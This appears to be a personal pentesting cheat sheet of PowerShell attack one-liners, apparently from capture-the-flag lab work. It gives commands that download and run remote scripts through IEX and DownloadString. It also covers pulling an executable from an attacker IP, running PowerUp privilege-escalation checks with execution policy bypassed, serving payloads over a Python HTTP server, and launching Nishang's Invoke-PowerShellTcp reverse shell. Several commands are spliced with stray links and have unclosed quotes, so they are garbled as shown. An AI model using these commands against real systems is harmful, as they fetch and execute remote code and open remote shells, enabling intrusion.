# **powershell**

For powershell reverse shell -> `powershell iex(new-object net.webclient).downloadstring('`[http://](http://10.10.14.14/Invoke-PowerShellTcp.ps1)`x.x.x.x         `powershell “IEX(New-Object Net.WebClient).downloadString('http://x.x.x.x  
  
powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://x.x.x.x  
  
powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"  
  
powershell -c "(new-object System.Net.WebClient).DownloadFile('[http://](http://10.10.14.30:9005/40564.exe',)x.x.x.x  
  
powershell Get-Content -Path "hm.txt"  -Stream "root.txt"   
  
wget [https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/P](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/P) owerUp.ps1 echo​ Invoke-AllChecks >> PowerUp.ps1 python3 -m http.server 80 iex(new-object net.webclient).downloadstring(​ip/powerup  
  
[https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1)  
  
  
  
[https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1%C2%A0)   
Invoke-PowerShellTcp -Reverse -IPAddress <IP Address> -Port <Port>  
powershell -ep bypass .\Invoke-PowerShellTcp.ps1